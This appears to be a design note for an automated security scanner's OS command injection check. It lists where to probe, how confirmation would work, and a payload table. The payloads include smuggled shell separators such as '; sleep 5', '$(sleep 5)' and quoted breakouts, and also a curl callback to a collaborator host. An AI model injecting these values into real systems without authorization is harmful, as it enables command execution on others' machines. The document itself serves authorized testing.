# OS Command Injection

Known, publicly-documented command-injection test cases Tom should attempt. The flaw lets
an attacker run operating-system commands because user input is passed into a shell (or a
command string) without neutralization.

**Status in the engine:** Documented — oracle not yet implemented (see below).

## Sources

- OWASP WSTG-INPV-12 — Testing for Command Injection
- PortSwigger Web Security Academy — OS command injection
- OWASP / PayloadsAllTheThings — Command Injection
- CWE-78 — Improper Neutralization of Special Elements used in an OS Command

## Where to look

Parameters that feed a system utility: filenames, archive/extract paths, image/PDF
conversion (ImageMagick, ffmpeg), ping/traceroute/DNS lookup tools, backup/export
features, `host=`, `ip=`, `domain=`, `cmd=`, `file=`, and any "run / process / convert"
action. Both query parameters and JSON body fields.

## How Tom would confirm it (the oracle)

Output reflected back is often absent, so confirmation is **blind and deterministic**,
mirroring the SQLi oracle:

1. **Time-based:** inject a command that delays (`; sleep 5`, `& ping -c 5 127.0.0.1 &`,
   `| sleep 5`) and confirm on a reproducible delay versus a fast control — proof the
   command ran. The probe re-checks before reporting.
2. **Out-of-band (where a listener exists):** inject a command that calls back to a
   tokenized collaborator (`; curl http://<token>.<collaborator>/`) and confirm when the
   listener receives the token.

A changed or error response is **not** proof on its own.

## Test cases

Each separator is tried because the vulnerable context differs (inline, quoted, backticks).

| # | Separator / context | Payload | What confirms it |
|---|---------------------|---------|------------------|
| 1 | Command chain | `; sleep 5` | reproducible 5s delay |
| 2 | Background / AND | `& ping -c 5 127.0.0.1 &` | reproducible delay |
| 3 | Pipe | `\| sleep 5` | reproducible delay |
| 4 | Command substitution | `` `sleep 5` ``, `$(sleep 5)` | reproducible delay |
| 5 | Quoted breakout | `" ; sleep 5 ; "`, `' ; sleep 5 ; '` | reproducible delay |
| 6 | Out-of-band | `; curl http://<token>.<collaborator>/` | listener gets the token |
| 7 | Windows | `& timeout 5`, `& ping -n 5 127.0.0.1` | reproducible delay |

## Method (per OWASP WSTG-INPV-12)

1. Enumerate parameters that feed a system utility or shell.
2. Inject time-delay payloads across the separators above; re-check any delay.
3. Where a listener exists, prefer the out-of-band callback for unambiguous proof.
4. On confirmed command execution, `report_finding` with the payload and the observed
   delay/callback.

## Oracle to implement

A time-based blind probe reusing the SQLi timing approach (baseline vs delayed, with a
re-check), plus the shared out-of-band listener once SSRF's listener lands.
